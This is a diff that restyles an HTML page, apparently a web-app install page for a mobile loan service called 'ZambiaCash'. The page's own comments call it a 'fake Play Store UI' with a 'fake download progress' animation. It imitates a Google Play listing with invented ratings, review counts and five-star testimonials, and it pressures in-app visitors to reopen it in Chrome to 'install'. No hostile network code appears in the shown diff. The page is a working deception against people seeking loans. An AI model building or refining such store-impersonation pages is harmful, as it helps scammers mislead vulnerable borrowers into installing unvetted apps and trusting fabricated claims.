@@ -7,7 +7,7 @@
     <meta name="theme-color" content="#1E40AF">
     <link rel="manifest" href="manifest.json">
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <script>
         tailwind.config = {
             theme: {
@@ -18,8 +18,13 @@
                     },
                     colors: {
                         brandBlue: '#1E40AF',
+                        brandLight: '#3B82F6',
                         brandYellow: '#F59E0B',
                         playBlue: '#0056D2',
+                    },
+                    boxShadow: {
+                        'soft': '0 10px 40px -10px rgba(0,0,0,0.08)',
+                        'glow': '0 0 20px rgba(59, 130, 246, 0.3)',
                     }
                 }
             }
@@ -29,24 +34,40 @@
         .hide { display: none !important; }
         .screen { display: none; flex-direction: column; min-height: 100vh; }
         .screen.active { display: flex; }
-        .gradient-bg { background: linear-gradient(135deg, #1E40AF 0%, #3B82F6 100%); }
-        .card { background: white; border-radius: 1.5rem; padding: 1.5rem; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1); }
-        input { width: 100%; padding: 0.75rem; border: 1.5px solid #E2E8F0; border-radius: 0.75rem; outline: none; font-size: 0.95rem; }
-        input:focus { border-color: #1E40AF; }
-        .amount-btn.selected { background-color: #1E40AF; color: white; border-color: #1E40AF; }
-        .term-btn.selected { background-color: #1E40AF; color: white; border-color: #1E40AF; }
+        .gradient-bg { background: linear-gradient(135deg, #0F172A 0%, #1E40AF 100%); }
+        .glass-card { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.2); }
+        input { width: 100%; padding: 0.85rem 1rem; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; outline: none; font-size: 0.95rem; transition: all 0.2s; background: #F8FAFC; }
+        input:focus { border-color: #3B82F6; background: #FFFFFF; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1); }
+        .amount-btn { transition: all 0.2s; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; font-weight: 600; color: #475569; background: white; }
+        .amount-btn.selected { background: linear-gradient(135deg, #1E40AF 0%, #3B82F6 100%); color: white; border-color: transparent; box-shadow: 0 8px 20px -6px rgba(30, 64, 175, 0.4); transform: translateY(-2px); }
+        .term-btn { transition: all 0.2s; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; font-weight: 600; color: #475569; background: white; }
+        .term-btn.selected { background: #1E40AF; color: white; border-color: #1E40AF; box-shadow: 0 4px 12px rgba(30, 64, 175, 0.3); }
         .hide-scrollbar::-webkit-scrollbar { display: none; }
-        @keyframes slideDown { from { transform: translateY(-100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        .toast { animation: slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+        
+        /* Custom Modal Animations */
+        @keyframes modalPop { 0% { transform: scale(0.9); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        .modal-pop { animation: modalPop 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+        
         .star { color: #FBBF24; }
-        .review-avatar {
-            width: 32px; height: 32px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            color: white; font-weight: bold; font-size: 14px;
-        }
+        .review-avatar { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 14px; }
     </style>
 </head>
 <body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
+
+    <!-- ============================================== -->
+    <!-- CUSTOM MODAL (Beautiful Pop-up)                -->
+    <!-- ============================================== -->
+    <div id="custom-modal" class="hide fixed inset-0 z-[20000] bg-slate-900/60 backdrop-blur-sm flex items-center justify-center p-6">
+        <div class="bg-white rounded-3xl w-full max-w-sm p-6 shadow-2xl modal-pop flex flex-col items-center text-center">
+            <div id="modal-icon-container" class="w-16 h-16 rounded-full flex items-center justify-center mb-4">
+                <!-- Icon goes here -->
+                <svg id="modal-icon" class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"></svg>
+            </div>
+            <h3 id="modal-title" class="text-xl font-extrabold text-slate-900 mb-2">Title</h3>
+            <p id="modal-message" class="text-sm text-slate-500 leading-relaxed mb-6">Message goes here</p>
+            <button onclick="closeModal()" class="w-full bg-brandBlue text-white font-bold py-3.5 rounded-xl shadow-lg active:scale-95 transition-transform">Got it</button>
+        </div>
+    </div>
 
     <!-- 0. OFFLINE GATE -->
     <div id="offline-gate" class="hide fixed inset-0 z-[11000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
@@ -64,7 +85,7 @@
     </div>
 
     <!-- 1. IN-APP BROWSER WARNING -->
-    <div id="browser-warning" class="hide fixed inset-0 z-[10000] bg-gray-900 flex flex-col items-center justify-center p-6 text-center">
+    <div id="browser-warning" class="hide fixed inset-0 z-[10000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
         <div class="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mb-4">
             <svg class="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
         </div>
@@ -73,216 +94,204 @@
             To install ZambiaCash, you must open this page in Google Chrome.
         </p>
         <button onclick="openInChrome()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl mb-3 font-sans">Open in Chrome</button>
-        <button onclick="copyLink()" class="w-full max-w-xs bg-gray-800 text-white font-bold py-3.5 rounded-xl border border-gray-700 font-sans">Copy Link</button>
+        <button onclick="copyLink()" class="w-full max-w-xs bg-slate-800 text-white font-bold py-3.5 rounded-xl border border-slate-700 font-sans">Copy Link</button>
     </div>
 
     <!-- 2. FAKE PLAY STORE UI -->
-    <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20">
+    <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20 font-sans">
         
         <!-- Top Bar -->
-        <div class="flex items-center justify-between p-4 sticky top-0 bg-white z-10">
+        <div class="flex items-center justify-between p-4 sticky top-0 bg-white/90 backdrop-blur-md z-10">
             <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
-            <!-- 3-dots menu icon -->
             <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path></svg>
         </div>
 
         <div class="p-5 max-w-lg mx-auto">
             <!-- App Header -->
             <div class="flex gap-4 mb-6">
-                <img src="icon.png" class="w-20 h-20 rounded-2xl shadow-sm border border-gray-100" alt="ZambiaCash Icon">
-                <div>
+                <img src="icon.png" class="w-24 h-24 rounded-3xl shadow-soft border border-gray-100" alt="ZambiaCash Icon">
+                <div class="flex flex-col justify-center">
                     <h1 class="text-2xl font-bold text-gray-900 leading-tight">ZambiaCash</h1>
-                    <p class="text-playBlue font-medium text-sm mt-1">ZambiaCash Financial</p>
+                    <p class="text-playBlue font-semibold text-sm mt-1">ZambiaCash Financial</p>
                     <p class="text-gray-500 text-xs mt-1">Contains ads</p>
                 </div>
             </div>
 
-            <!-- ============================================== -->
-            <!-- PRE-INSTALL BUTTONS (Install)                  -->
-            <!-- ============================================== -->
+            <!-- PRE-INSTALL BUTTONS -->
             <div class="flex gap-2 mb-6" id="pre-install-buttons">
-                <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-medium text-lg py-3 rounded-full shadow-sm active:scale-95 transition-transform">Install</button>
+                <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-soft active:scale-95 transition-transform">Install</button>
             </div>
 
-            <!-- ============================================== -->
-            <!-- POST-INSTALL BUTTONS (Uninstall / Open)        -->
-            <!-- ============================================== -->
+            <!-- POST-INSTALL BUTTONS -->
             <div class="flex gap-3 mb-6 hide" id="post-install-buttons">
-                <button onclick="mockUninstall()" class="flex-1 bg-white text-playBlue font-medium text-lg py-3 rounded-full border border-gray-300 active:scale-95 transition-transform">Uninstall</button>
-                <button id="btn-open-app" class="flex-1 bg-playBlue text-white font-medium text-lg py-3 rounded-full shadow-sm active:scale-95 transition-transform">Open</button>
+                <button onclick="mockUninstall()" class="flex-1 bg-white text-playBlue font-semibold text-lg py-3.5 rounded-full border-2 border-gray-200 active:scale-95 transition-transform">Uninstall</button>
+                <button id="btn-open-app" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-soft active:scale-95 transition-transform">Open</button>
             </div>
 
-            <!-- FAKE DOWNLOAD PROGRESS (Circular Animation) -->
-            <div id="fake-download-area" class="hide mb-6 flex flex-col items-center justify-center py-4">
-                <div class="relative w-28 h-28 mb-3">
-                    <!-- SVG Circular Progress -->
+            <!-- FAKE DOWNLOAD PROGRESS -->
+            <div id="fake-download-area" class="hide mb-6 flex flex-col items-center justify-center py-6">
+                <div class="relative w-32 h-32 mb-4">
                     <svg class="w-full h-full transform -rotate-90">
-                        <circle cx="56" cy="56" r="50" stroke="#E5E7EB" stroke-width="5" fill="none" />
-                        <circle id="circle-progress" cx="56" cy="56" r="50" stroke="#0056D2" stroke-width="5" fill="none" stroke-dasharray="314" stroke-dashoffset="314" class="transition-all duration-300"/>
+                        <circle cx="64" cy="64" r="56" stroke="#F1F5F9" stroke-width="6" fill="none" />
+                        <circle id="circle-progress" cx="64" cy="64" r="56" stroke="#0056D2" stroke-width="6" fill="none" stroke-dasharray="351" stroke-dashoffset="351" class="transition-all duration-300"/>
                     </svg>
-                    <!-- App Icon in the middle -->
-                    <img src="icon.png" class="absolute inset-4 w-20 h-20 rounded-2xl shadow-md border border-gray-100 object-cover" alt="Icon">
+                    <img src="icon.png" class="absolute inset-4 w-24 h-24 rounded-2xl shadow-md border border-gray-100 object-cover" alt="Icon">
                 </div>
                 <div class="text-center">
-                    <span id="download-percent" class="text-2xl font-bold text-gray-800">0%</span>
+                    <span id="download-percent" class="text-3xl font-extrabold text-gray-800">0%</span>
+                    <p class="text-sm font-medium text-playBlue mt-1" id="download-status">Downloading...</p>
                     <p class="text-xs text-gray-500 mt-1" id="download-size">1.2 MB / 10.0 MB</p>
                 </div>
             </div>
 
-            <!-- ============================================== -->
-            <!-- PRE-INSTALL CONTENT (Stats, Screenshots, Info) -->
-            <!-- ============================================== -->
+            <!-- PRE-INSTALL CONTENT -->
             <div id="pre-install-content">
                 <!-- Stats Row -->
-                <div class="flex justify-between items-center text-center py-4 mb-6 border-y border-gray-100" id="stats-row">
+                <div class="flex justify-between items-center text-center py-5 mb-6 border-y border-gray-100" id="stats-row">
                     <div class="flex-1 flex flex-col items-center">
                         <div class="flex items-center gap-1">
-                            <span class="font-bold text-sm">4.5</span>
-                            <svg class="w-3 h-3 text-gray-800" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
+                            <span class="font-bold text-base">4.5</span>
+                            <svg class="w-4 h-4 text-gray-800" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
                         </div>
-                        <span class="text-[10px] text-gray-600">12K reviews</span>
+                        <span class="text-[11px] text-gray-600 mt-1">12K reviews</span>
                     </div>
-                    <div class="w-px h-8 bg-gray-200"></div>
+                    <div class="w-px h-10 bg-gray-200"></div>
                     <div class="flex-1 flex flex-col items-center">
-                        <svg class="w-4 h-4 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
+                        <svg class="w-5 h-5 mb-1 text-gray-800" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
                         <span class="font-bold text-xs">10 MB</span>
                     </div>
-                    <div class="w-px h-8 bg-gray-200"></div>
+                    <div class="w-px h-10 bg-gray-200"></div>
                     <div class="flex-1 flex flex-col items-center">
-                        <div class="border border-gray-600 rounded px-1 text-[10px] font-bold mb-1">12+</div>
-                        <span class="text-[10px] text-gray-600">Rated for 12+</span>
+                        <div class="border border-gray-600 rounded px-1.5 text-[11px] font-bold mb-1">12+</div>
+                        <span class="text-[11px] text-gray-600">Rated for 12+</span>
                     </div>
                 </div>
 
                 <!-- Screenshots -->
-                <div class="flex gap-3 overflow-x-auto hide-scrollbar mb-6 pb-2">
-                    <div class="w-40 h-72 bg-brandBlue rounded-xl flex-shrink-0 p-4 flex flex-col justify-between shadow-md">
+                <div class="flex gap-4 overflow-x-auto hide-scrollbar mb-8 pb-4 snap-x">
+                    <div class="w-44 h-80 bg-gradient-to-br from-brandBlue to-brandLight rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
                         <div>
-                            <p class="text-blue-200 text-[10px] font-bold tracking-wider">AVAILABLE LIMIT</p>
-                            <p class="text-white text-2xl font-extrabold mt-1">Ksh 50,000</p>
+                            <p class="text-blue-200 text-[11px] font-bold tracking-widest uppercase">Available Limit</p>
+                            <p class="text-white text-3xl font-extrabold mt-2">Ksh 50,000</p>
                         </div>
-                        <div class="bg-white/20 rounded-lg p-3">
+                        <div class="bg-white/20 backdrop-blur rounded-xl p-4 border border-white/20">
                             <p class="text-white text-sm font-bold">Instant Disbursement</p>
-                            <p class="text-blue-100 text-[10px] mt-1">Straight to M-Pesa</p>
+                            <p class="text-blue-100 text-[11px] mt-1">Straight to M-Pesa</p>
                         </div>
                     </div>
-                    <div class="w-40 h-72 bg-white border border-gray-200 rounded-xl flex-shrink-0 p-4 flex flex-col justify-between shadow-md">
+                    <div class="w-44 h-80 bg-white border border-gray-200 rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
                         <div>
-                            <p class="text-gray-500 text-[10px] font-bold tracking-wider">INTEREST RATES</p>
-                            <p class="text-brandBlue text-3xl font-extrabold mt-1">10%</p>
-                            <p class="text-gray-500 text-xs mt-1">Only</p>
+                            <p class="text-gray-400 text-[11px] font-bold tracking-widest uppercase">Interest Rates</p>
+                            <p class="text-brandBlue text-4xl font-extrabold mt-2">10%</p>
+                            <p class="text-gray-500 text-sm font-medium mt-1">Only</p>
                         </div>
-                        <div class="bg-brandBlue/10 rounded-lg p-3">
+                        <div class="bg-blue-50 rounded-xl p-4 border border-blue-100">
                             <p class="text-brandBlue text-sm font-bold">Low Cost</p>
-                            <p class="text-gray-600 text-[10px] mt-1">No hidden fees</p>
+                            <p class="text-gray-500 text-[11px] mt-1">No hidden fees</p>
                         </div>
                     </div>
-                    <div class="w-40 h-72 bg-green-500 rounded-xl flex-shrink-0 p-4 flex flex-col justify-between shadow-md">
+                    <div class="w-44 h-80 bg-emerald-500 rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
                         <div>
-                            <p class="text-green-100 text-[10px] font-bold tracking-wider">APPROVAL TIME</p>
-                            <p class="text-white text-3xl font-extrabold mt-1">2 Min</p>
+                            <p class="text-emerald-100 text-[11px] font-bold tracking-widest uppercase">Approval Time</p>
+                            <p class="text-white text-4xl font-extrabold mt-2">2 Min</p>
                         </div>
-                        <div class="bg-white/20 rounded-lg p-3">
+                        <div class="bg-white/20 backdrop-blur rounded-xl p-4 border border-white/20">
                             <p class="text-white text-sm font-bold">Fastest Loans</p>
-                            <p class="text-green-100 text-[10px] mt-1">24/7 Available</p>
+                            <p class="text-emerald-50 text-[11px] mt-1">24/7 Available</p>
                         </div>
                     </div>
                 </div>
 
                 <!-- About App -->
-                <div class="mb-6">
-                    <div class="flex items-center justify-between mb-2">
-                        <h3 class="font-bold text-lg">About this app</h3>
-                        <svg class="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                <div class="mb-8">
+                    <div class="flex items-center justify-between mb-3">
+                        <h3 class="font-bold text-xl text-gray-900">About this app</h3>
+                        <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
                     </div>
-                    <p class="text-sm text-gray-700 leading-relaxed">
+                    <p class="text-sm text-gray-600 leading-relaxed">
                         Get instant mobile loans from Ksh 1,000 to Ksh 50,000 directly to your M-Pesa. We offer low interest rates, instant disbursement, and flexible repayment terms of 30 to 90 days. No paperwork, 100% online.
                     </p>
                 </div>
 
                 <!-- Ratings -->
-                <div class="border-t border-gray-100 pt-6">
-                    <div class="flex items-center justify-between mb-4">
-                        <h3 class="font-bold text-lg">Ratings and reviews</h3>
-                        <svg class="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                <div class="border-t border-gray-100 pt-8">
+                    <div class="flex items-center justify-between mb-5">
+                        <h3 class="font-bold text-xl text-gray-900">Ratings and reviews</h3>
+                        <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
                     </div>
-                    <div class="space-y-6">
+                    <div class="space-y-7">
                         <div>
                             <div class="flex items-center gap-3 mb-2">
                                 <div class="review-avatar bg-purple-500">J</div>
                                 <div>
-                                    <p class="text-sm font-medium text-gray-900">James Mwangi</p>
+                                    <p class="text-sm font-semibold text-gray-900">James Mwangi</p>
                                     <p class="text-[11px] text-gray-500">2 days ago</p>
                                 </div>
                             </div>
-                            <div class="flex items-center gap-1 mb-1.5"><span class="star">★★★★★</span></div>
-                            <p class="text-sm text-gray-700 leading-snug">The disbursement is instant. I applied for a loan and received the M-Pesa message in less than 2 minutes. Truly impressive.</p>
+                            <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★★</span></div>
+                            <p class="text-sm text-gray-600 leading-relaxed">The disbursement is instant. I applied for a loan and received the M-Pesa message in less than 2 minutes. Truly impressive.</p>
                         </div>
                         <div>
                             <div class="flex items-center gap-3 mb-2">
                                 <div class="review-avatar bg-pink-500">M</div>
                                 <div>
-                                    <p class="text-sm font-medium text-gray-900">Mary Wanjiku</p>
+                                    <p class="text-sm font-semibold text-gray-900">Mary Wanjiku</p>
                                     <p class="text-[11px] text-gray-500">1 week ago</p>
                                 </div>
                             </div>
-                            <div class="flex items-center gap-1 mb-1.5"><span class="star">★★★★★</span></div>
-                            <p class="text-sm text-gray-700 leading-snug">The interest rates are very low compared to other apps I've used. Very fair terms and easy to repay.</p>
+                            <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★★</span></div>
+                            <p class="text-sm text-gray-600 leading-relaxed">The interest rates are very low compared to other apps I've used. Very fair terms and easy to repay.</p>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <!-- ============================================== -->
-            <!-- POST-INSTALL CONTENT (What's new & Rate)       -->
-            <!-- ============================================== -->
+            <!-- POST-INSTALL CONTENT -->
             <div id="post-install-content" class="hide">
-                <!-- What's New -->
                 <div class="mb-8 border-t border-gray-100 pt-6">
-                    <div class="flex justify-between items-center mb-1">
+                    <div class="flex justify-between items-center mb-2">
                         <div class="flex items-center gap-2">
-                            <h3 class="font-bold text-xl">What's new</h3>
-                            <div class="w-2 h-2 rounded-full bg-playBlue"></div>
+                            <h3 class="font-bold text-xl text-gray-900">What's new</h3>
+                            <div class="w-2.5 h-2.5 rounded-full bg-playBlue"></div>
                         </div>
                         <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
                     </div>
-                    <p class="text-sm text-gray-500 mb-3">Last updated Aug 31, 2026</p>
-                    <ul class="text-sm text-gray-700 space-y-1">
+                    <p class="text-sm text-gray-500 mb-4">Last updated Aug 31, 2026</p>
+                    <ul class="text-sm text-gray-700 space-y-2 font-medium">
                         <li>- Fixed bugs</li>
                         <li>- Performance Improvements</li>
                     </ul>
                 </div>
 
-                <!-- Rate this app -->
-                <div class="mb-8 border-t border-gray-100 pt-6">
-                    <h3 class="font-bold text-xl mb-1">Rate this app</h3>
-                    <p class="text-sm text-gray-500 mb-4">Tell others what you think</p>
-                    <div class="flex justify-between items-center mb-4 px-2">
+                <div class="mb-8 border-t border-gray-100 pt-8">
+                    <h3 class="font-bold text-xl mb-1 text-gray-900">Rate this app</h3>
+                    <p class="text-sm text-gray-500 mb-6">Tell others what you think</p>
+                    <div class="flex justify-between items-center mb-6 px-2">
                         <!-- 5 Outline Stars -->
-                        <svg class="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
-                        <svg class="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
-                        <svg class="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
-                        <svg class="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
-                        <svg class="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                        <svg class="w-9 h-9 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                        <svg class="w-9 h-9 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                        <svg class="w-9 h-9 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                        <svg class="w-9 h-9 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                        <svg class="w-9 h-9 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
                     </div>
-                    <button class="text-playBlue font-medium text-sm">Write a review</button>
+                    <button class="text-playBlue font-semibold text-sm">Write a review</button>
                 </div>
             </div>
 
         </div>
 
